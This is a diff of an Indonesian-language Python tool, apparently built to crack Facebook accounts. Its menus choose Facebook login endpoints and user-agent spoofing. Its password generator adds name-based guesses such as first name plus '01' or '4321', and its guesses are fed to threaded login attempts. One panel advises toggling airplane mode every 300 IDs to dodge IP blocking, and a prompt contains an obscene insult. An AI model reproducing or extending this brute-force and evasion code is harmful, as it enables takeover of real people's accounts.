-	urut.append(panel(f'[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]05[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]06[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=43,title=f"[bold green]Reguler",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold cyan]07[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]08[/][bold white]][/] [bold white]Login Site [bold green]developer.facebook.com[bold white] ',width=43,title=f"[bold green]B-Api And Async",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold cyan]09[/][bold white]][/] [bold white]Login Site [bold green]x.facebook.com[bold white] [/]\n[bold white][[bold cyan]10[/][bold white]][/] [bold white]Login Site [bold green]d.facebook.com[bold white] ',width=43,title=f"[bold green]Old Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Login Site [bold green]free.facebook.com[bold white] ',width=43,title=f"[bold green]Validate",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]04[/][bold white]][/] [bold cyan]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold green]05[/][bold white]][/] [bold cyan]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold green]06[/][bold white]][/] [bold cyan]Login Site [bold green]free.facebook.com[bold white] ',width=43,title=f"[bold green]Reguler",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]07[/][bold white]][/] [bold cyan]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold green]08[/][bold white]][/] [bold cyan]Login Site [bold green]developer.facebook.com[bold white] ',width=43,title=f"[bold green]B-Api And Async",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]09[/][bold white]][/] [bold cyan]Login Site [bold green]x.facebook.com[bold white] [/]\n[bold white][[bold green]10[/][bold white]][/] [bold cyan]Login Site [bold green]d.facebook.com[bold white] ',width=43,title=f"[bold green]Old Metode",style=f"bold white"))
 	console.print(Columns(urut))
-	hc = input(f' [+] Pilih Metode : ')
+	hc = input(f' {P}[{H}+{P}] \33[1;96mPilih Metode : {P}')
 	if hc in ['1','01']:
 		method.append('validate1')
 	elif hc in ['2','02']:
@@ -1192,44 +1297,44 @@ def setting():
 	    method.append('colmek2')
 	else:
 		method.append('validate1')
-	cetak(panel('''[bold white][[bold cyan]01[bold white]] [bold white]Menggunakan Password V1 [[bold green]Recommended[bold white]]
-[bold white][[bold cyan]02[bold white]] [bold white]Menggunakan Password V2 [[bold green]Very Recommended[bold white]]
-[bold white][[bold cyan]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',padding=(0,8),width=90))
-	pwplus=input(f' [+] {P}Pilih Sandi : ')
+	cetak(panel('''[bold white][[bold cyan]01[bold cyan]] [bold white]Menggunakan Password V1 [[bold green]Recommended[bold white]]
+[bold white][[bold green]02[bold white]] [bold cyan]Menggunakan Password V2 [[bold green]Very Recommended[bold white]]
+[bold white][[bold green]03[bold white]] [bold cyan]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',padding=(0,8),width=90))
+	pwplus=input(f' {P}[{H}+{P}] \33[1;96mPilih Sandi : {P}')
 	if pwplus in ['03','3']:
 		pwpluss.append('ya')
-		pwku=input(f' [+] {P}Sandi : ')
+		pwku=input(f' {P}[{H}+{P}] \33[1;96mSandi : {P}')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
 	else:
 		pwpluss.append('no')
 	
-	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting Cek Apk",style=f"bold white"))
-	_brayen_ = input(' [+] Pilih : ')
+	cetak(panel(f'      [bold cyan]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting Cek Apk",style=f"bold white"))
+	_brayen_ = input(' {P}[{H}+{P}] \33[1;96mPilih : {P}')
 	if _brayen_ in ['']:
-		print(' [+] Pilih Yang Bener Kontol ')
+		print(' [+] \33[1;91mPilih Yang Bener Kontol ')
 		back()
 	elif _brayen_ in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
 		
-	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Cek Opsi",style=f"bold white"))
-	_brayen_ = input(' [+] Pilih : ')
+	cetak(panel(f'      [bold cyan]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Cek Opsi",style=f"bold white"))
+	_brayen_ = input(' {P}[{H}+{P}] \33[1;96mPilih : {P}')
 	if _brayen_ in ['']:
-		print(' [+] Pilih Yang Bener Kontol ')
+		print(' [+] \33[1;91mPilih Yang Bener Kontol ')
 		back()
 	elif _brayen_ in ['y','Y']:
 		gabriel.append('ya')
 	else:
 		gabriel.append('no')
 	
-	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
-	uatambah = input(f' [+] Pilih : ')
+	cetak(panel(f'[bold cyan]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
+	uatambah = input(f' {P}[{H}+{P}] \33[1;96m Pilih : {P}')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
-		bzer = input(f' [+] Masukan User-Agent : ')
+		bzer = input(f' {P}[{H}+{P}] \33[1;96mMasukan User-Agent : {P}')
 		ualu.append(bzer)
 	else:
 		ualuh.append('tidak')
@@ -1242,7 +1347,7 @@ def passwrd():
 	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=43,title=f"[bold green]OK SAVE IN",style=f"bold white"))
 	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=44,title=f"[bold yellow]CP SAVE IN",style=f"bold white"))
 	wa.print(Columns(urut))
-	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
+	cetak(panel(f'\t[bold cyan]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -1274,6 +1379,18 @@ def passwrd():
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
+						pwv.append(frs+'1')
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append(frs+'07')
+						pwv.append(frs+'08')
+						pwv.append(frs+'09')
+						pwv.append(frs+'12')
+						pwv.append(frs+'4321')
 						pwv.append(frs+'12')
 						pwv.append(frs+'321')
 						pwv.append(frs+'123')
@@ -1307,8 +1424,8 @@ def passwrd():
 				else:
 					pool.submit(validate1,idf,pwv)
 		print('')
-	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
-	print(f'  [{h}•{x}]{h} OK : {h}%s '%(ok))
+	print(f'\33[1;96m  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
+	print(f'{x}  [{h}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
 
 #--------------------[ METODE VALIDATE ]-----------------#
